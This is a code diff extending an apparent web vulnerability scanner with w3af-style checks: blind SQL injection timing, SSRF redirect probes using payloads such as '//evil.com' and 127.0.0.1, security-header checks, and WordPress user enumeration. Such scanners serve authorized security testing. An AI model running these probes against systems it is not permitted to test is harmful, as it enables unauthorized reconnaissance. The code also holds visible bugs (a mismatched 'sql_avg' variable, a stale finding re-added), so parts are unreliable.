+                    description=f"精准时序分析：正常请求平均{base_avg:.2f}s，注入SLEEP后{sql_avg:.2f}s（差值{sqli_avg - base_avg:.2f}s > 2.5s阈值），置信度高",
+                    url='', evidence=f"Baseline: {base_avg:.3f}s | SQLi: {sqli_avg:.3f}s | Delta: {sqli_avg - base_avg:.3f}s",
+                    recommendation='使用参数化查询，添加输入验证和WAF规则',
+                    cwe='CWE-89', cvss=7.5
+                ))
+
+        return findings
+
+
+# ==================== SSRFDetector增强 — URL重定向测试（借鉴w3af audit/redirect）====================
+class SSRFDetectorEnhanced:
+    """SSRF增强检测 — URL重定向漏洞 + 协议BOM + CIDR探测"""
+
+    @staticmethod
+    def detect(url: str, context: Dict = None) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+        if not parsed.query:
+            return findings
+
+        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
+        testable = SSRFDetector._get_testable_params(params, url)
+
+        # URL重定向测试（额外探测）
+        redirect_payloads = [
+            ('http://127.0.0.1', 'URL重定向-内网'),
+            ('https://127.0.0.1', 'URL重定向-HTTPS内网'),
+            ('//evil.com', 'URL重定向-协议相对'),
+            ('\\evil.com', 'URL重定向-Windows路径欺骗'),
+        ]
+
+        for param_name, original_val in testable.items():
+            for redirect_url, desc in redirect_payloads:
+                try:
+                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                    qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={redirect_url}" for k, v in params.items())
+                    test_url += f"?{qs}"
+                    resp = requests.get(test_url, timeout=5, allow_redirects=False)
+
+                    # 检查响应中的重定向头
+                    location = resp.headers.get('Location', '') or resp.headers.get('location', '')
+                    if location and ('127.0.0.1' in location or 'evil.com' in location or 'localhost' in location):
+                        findings.append(VulnFinding(
+                            id=f'SSRF_REDIRECT_{param_name}',
+                            severity=Severity.HIGH,
+                            title=f'URL重定向SSRF [{desc}]',
+                            description=f'参数{param_name}允许将请求重定向到指定地址，可能导致内网访问',
+                            url=test_url, evidence=f"Location: {location}",
+                            recommendation='对用户提供的URL进行白名单校验，禁止重定向到内网地址',
+                            cwe='CWE-601', cvss=7.5
+                        ))
+
+                except Exception as e:
+                    logger.debug(f"SSRF redirect test failed for {param_name}: {e}")
+
+        # 重用原有SSRF检测逻辑（合并结果）
+        original_findings = SSRFDetector.detect(url, context)
+        findings.extend(original_findings)
+        return findings
+
+
+# ==================== HeaderChecker增强 — 更多安全头（借鉴w3af audit/ssl_certificate + xss）====================
+class ExtendedHeaderChecker:
+    """扩展HTTP安全头检测 — w3af中缺失的安全头"""
+
+    @staticmethod
+    def check(headers: Dict[str, str]) -> List[VulnFinding]:
+        findings = []
+        header_keys_lower = {h.lower(): h for h in headers.keys()}
+
+        # 新增安全头检测
+        extended_checks = [
+            {
+                'name': 'Feature-Policy',
+                'desc': '未设置Feature-Policy（已废弃，替代为Permissions-Policy）',
+                'severity': Severity.LOW,
+                'cwe': 'CWE-16', 'cvss': 3.1,
+            },
+            {
+                'name': 'Clear-Site-Data',
+                'desc': '未设置Clear-Site-Data头，客户端敏感数据可能未被清除',
+                'severity': Severity.LOW,
+                'cwe': 'CWE-524', 'cvss': 3.1,
+            },
+            {
+                'name': 'Cross-Origin-Opener-Policy',
+                'desc': '未设置COOP，可能遭受Cooperative Cross-Origin Isolation攻击',
+                'severity': Severity.MEDIUM,
+                'cwe': 'CWE-286', 'cvss': 5.3,
+            },
+            {
+                'name': 'Cross-Origin-Resource-Policy',
+                'desc': '未设置CORP，资源可能被跨源嵌入利用',
+                'severity': Severity.LOW,
+                'cwe': 'CWE-16', 'cvss': 3.1,
+            },
+            {
+                'name': 'Cross-Origin-Embedder-Policy',
+                'desc': '未设置COEP，可能导致跨源数据泄漏',
+                'severity': Severity.LOW,
+                'cwe': 'CWE-16', 'cvss': 3.1,
+            },
+        ]
+
+        for check in extended_checks:
+            if check['name'].lower() not in header_keys_lower:
+                findings.append(VulnFinding(
+                    id=f'MISSING_{check["name"].upper()}',
+                    severity=check['severity'],
+                    title=f'缺少 {check["name"]} 头',
+                    description=check['desc'],
+                    url='', recommendation=f'添加响应头: {check["name"]}: same-origin',
+                    cwe=check['cwe'], cvss=check['cvss'],
+                    params={'header': check['name']}
+                ))
+
+        return findings
+
+
+# ==================== CMS指纹识别增强（借鉴w3af crawl/wordpress_fingerprint + open_api）====================
+class CMSEnumDetector:
+    """CMS/技术栈深度指纹识别 — 识别插件、版本、用户"""
+
+    PLUGINS_TO_CHECK = {
+        'WordPress Plugin Detect': [
+            '/wp-content/plugins/', '/wp-content/themes/',
+            'wp-content/uploads/', 'wp-includes/js/wp-embed.js',
+        ],
+        'Joomla Component': ['/components/com_', '/modules/mod_'],
+        'Drupal Module': ['/sites/default/files/', '/core/'],
+    }
+
+    @staticmethod
+    def detect(html: str, url: str) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        # WordPress version fingerprinting
+        wp_vers = re.findall(r'version=[\d.]+', html, re.IGNORECASE)
+        if wp_vers:
+            vers = list(set(wp_vers))[:1]  # take first unique
+            findings.append(VulnFinding(
+                id='CMS_WP_VERSION',
+                severity=Severity.INFO,
+                title=f'WordPress版本泄露: {vers}',
+                description=f'WordPress版本号公开，可利用对应版本的已知CVE漏洞',
+                url=url, evidence=str(vers),
+                recommendation='隐藏WordPress版本号（如修改header.php中的generator）',
+                cwe='CWE-200', cvss=3.1
+            ))
+
+        # WordPress user enumeration (author pages)
+        if 'wp-content' in html or 'wordpress' in html.lower():
+            author_paths = [f'{base_url}/wp-json/wp/v2/users', f'{base_url}/xmlrpc.php']
+            for ap in author_paths:
+                try:
+                    resp = requests.get(ap, timeout=5)
+                    if resp.status_code == 200 and '[' in resp.text[:20]:
+                        findings.append(VulnFinding(
+                            id='CMS_WP_USER_ENUM',
+                            severity=Severity.MEDIUM,
+                            title=f'WordPress用户枚举端点公开 ({ap})',
+                            description='WordPress REST API允许枚举所有注册用户信息',
+                            url=ap, evidence=f'JSON with {len(resp.text)} bytes',
+                            recommendation='禁用REST API的用户枚举：add_filter("rest_authentication_error", ...)',
+                            cwe='CWE-203', cvss=5.3
+                        ))
+                except Exception:
+                    pass
+
+        return findings
+
+
+# ==================== 敏感信息泄露检测（原有）====================
 class SensitiveDataDetector:
     """敏感信息泄露检测"""
 
@@ -1325,7 +2168,85 @@ class URLScanner:
             for f in rce_findings:
                 result.add_finding(f)
 
-        # ==================== 10. 敏感信息泄露 ====================
+        # ==================== 10. XXE注入检测（w3af）====================
+        if CONFIG['urls'].get('check_xxe', True):
+            logger.info("🧬 检查XXE注入...")
+            xxe_findings = XXEDetector.detect(target_url)
+            for f in xxe_findings:
+                result.add_finding(f)
+
+        # ==================== 11. 文件上传漏洞检测（w3af）====================
+        if CONFIG['urls'].get('check_file_upload', True):
+            logger.info("📤 检查文件上传漏洞...")
+            fu_findings = FileUploadDetector.detect(target_url)
+            for f in fu_findings:
+                result.add_finding(f)
+
+        # ==================== 12. 反序列化漏洞检测（w3af）====================
+        if CONFIG['urls'].get('check_deserialization', True):
+            logger.info("🔗 检查反序列化漏洞...")
+            des_findings = DeserializationDetector.detect(target_url)
+            for f in des_findings:
+                result.add_finding(f)
+
+        # ==================== 13. HTTP方法安全检测（w3af）====================
+        if CONFIG['urls'].get('check_http_methods', True):
+            logger.info("🔧 检查HTTP方法安全...")
+            http_method_findings = HTTPMethodsChecker.check(target_url)
+            for f in http_method_findings:
+                f.url = target_url
+                result.add_finding(f)
+
+        # ==================== 14. VCS泄露检测（w3af）====================
+        if CONFIG['urls'].get('check_dvcs_leak', True):
+            logger.info("📦 检查版本控制系统泄露...")
+            dvcs_findings = DVCSLeakDetector.detect(target_url)
+            for f in dvcs_findings:
+                result.add_finding(f)
+
+        # ==================== 15. OpenAPI/Swagger发现（w3af）====================
+        if CONFIG['urls'].get('check_openapi', True):
+            logger.info("📚 发现OpenAPI/Swagger文档...")
+            openapi_findings = OpenAPIDiscovery.detect(target_url)
+            for f in openapi_findings:
+                result.add_finding(f)
+            result.openapi_urls = [{'url': o.url, 'endpoints': getattr(o, 'params', {}).get('endpoints', '?')} for o in openapi_findings]
+
+        # ==================== 16. CMS/框架指纹识别（w3af）====================
+        if CONFIG['urls'].get('check_cms_fingerprint', True):
+            logger.info("🕵️ CMS/框架指纹识别...")
+            cms_findings = CMSEnumDetector.detect(resp.text, target_url)
+            for f in cms_findings:
+                result.add_finding(f)
+            # 额外从HTML直接提取CMS信息
+            cms_detected = CMSFingerprint.fingerprint(resp.text)
+            if cms_detected:
+                result.cms_fingerprints.extend(cms_detected)
+                result.add_finding(f)
+
+        # ==================== 17. SQL盲注增强（w3af）====================
+        if CONFIG['urls'].get('check_sqli_blind', True) and parsed.query:
+            logger.info("⏱️ 增强Blind SQLi检测...")
+            blind_findings = SQLiBlindDetector.detect(target_url)
+            for f in blind_findings:
+                result.add_finding(f)
+
+        # ==================== 18. SSRF重定向测试（w3af）====================
+        if CONFIG['urls'].get('check_ssrf_redirect', True) and parsed.query:
+            logger.info("🔄 SSRF重定向测试...")
+            ssrf_ext_findings = SSRFDetectorEnhanced.detect(target_url, {})
+            for f in ssrf_ext_findings:
+                result.add_finding(f)
+
+        # ==================== 19. 扩展安全头检测（w3af）====================
+        if CONFIG['urls'].get('check_extended_headers', True):
+            logger.info("🛡️ 检查扩展安全头...")
+            ext_header_findings = ExtendedHeaderChecker.check(resp.headers)
+            for f in ext_header_findings:
+                f.url = target_url
+                result.add_finding(f)
+
+        # ==================== 21. 敏感信息泄露 ====================
         if CONFIG['urls'].get('check_sensitive_data', True):
             logger.info("🕵️ 扫描敏感信息泄露...")
             sensitive_findings = SensitiveDataDetector.detect(resp.text)
@@ -1333,7 +2254,7 @@ class URLScanner:
                 f.url = target_url
                 result.add_finding(f)
 
-        # ==================== 11. 子域名枚举 ====================
+        # ==================== 22. 子域名枚举 ====================
         if CONFIG['urls'].get('enum_subdomains', True):
             logger.info("🌳 子域名枚举...")
             ext = tldextract.extract(parsed.hostname)
@@ -1342,7 +2263,7 @@ class URLScanner:
             if result.subdomains:
                 logger.info(f"  发现 {len(result.subdomains)} 个子域名: {', '.join(result.subdomains[:10])}")
 
-        # ==================== 12. 目录爆破 ====================
+        # ==================== 23. 目录爆破 ====================
         if CONFIG['urls'].get('dir_busting', {}).get('enabled', False):
             logger.info("📂 目录爆破...")
             result.dir_bust_results = DirBuster.bust(target_url)
@@ -1350,7 +2271,7 @@ class URLScanner:
             if dangerous:
                 logger.warning(f"  ⚠️ 发现 {len(dangerous)} 个敏感路径!")
 
-        # ==================== 13. URL发现 ====================
+        # ==================== 24. URL发现 ====================
         soup = BeautifulSoup(resp.text, 'lxml')
         for a_tag in soup.find_all('a', href=True):
             full_url = urljoin(target_url, a_tag['href'])
@@ -1558,10 +2479,22 @@ class ReportGenerator:
                 html += f'<tr><td style="word-break:break-all;color:#79c0ff">{d["url"]}</td><td>{d["status"]}</td><td style="color:{color}">{"敏感" if d.get("dangerous") else "普通"}</td></tr>'
             html += '</table>'
 
+        # OpenAPI/Swagger发现（w3af整合）
+        if result.openapi_urls:
+            html += '<h2 class="section-title">📚 OpenAPI/Swagger文档 (w3af)</h2><table><tr><th>URL</th><th>端点数</th></tr>'
+            for o in result.openapi_urls:
+                html += f'<tr><td style="word-break:break-all;color:#79c0ff">{o["url"]}</td><td>{o.get("endpoints", "?")}</td></tr>'
+            html += '</table>'
+
+        # CMS指纹识别（w3af整合）
+        if result.cms_fingerprints:
+            cms_tags = ''.join(f'<span class="tag">CMS: {c}</span>' for c in result.cms_fingerprints)
+            html += f'<h2 class="section-title">🖥️ CMS/框架指纹识别 (w3af)</h2><div class="tech-list">{cms_tags}</div>'
+
         html += f"""
         </div>
         <footer>
-            <p>🔐 Hack Scanner v1.0 | Generated by Automated Penetration Testing Framework</p>
+            <p>🔐 Hack Scanner v2.0 | OWASP TOP10 + w3af 深度整合</p>
             <p style="margin-top:0.5rem;">本报告仅供授权安全测试使用，请遵守相关法律法规</p>
         </footer>
     </div>
